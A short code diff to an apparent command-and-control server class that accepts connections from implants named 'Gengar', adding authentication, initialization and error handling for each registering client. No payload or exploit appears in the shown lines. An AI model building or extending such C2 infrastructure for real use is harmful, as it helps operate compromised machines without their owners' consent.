@@ -1,7 +1,8 @@
 import socket
 import threading
+from datetime import datetime
 
-from gengar import Gengar
+from gengar import Gengar, GengarAuthenticationFailed
 from logger import logger
 
 
@@ -25,4 +26,14 @@ class CNCServer:
         while True:
             gengar_sock, (gengar_host, _) = self.sock.accept()
             logger.info(f'Received Gengar connection @ {gengar_host}')
-            self.gengars.append(Gengar(gengar_sock, gengar_host))
+            gengar = Gengar(gengar_sock, gengar_host, datetime.now())
+            try:
+                gengar.auth()
+                gengar.init()
+                self.gengars.append(gengar)
+            except GengarAuthenticationFailed:
+                logger.error('Failed to authenticate Gengar.')
+                gengar_sock.close()
+            except ConnectionResetError:
+                logger.error('Gengar disconnected during initialization.')
+                gengar_sock.close()
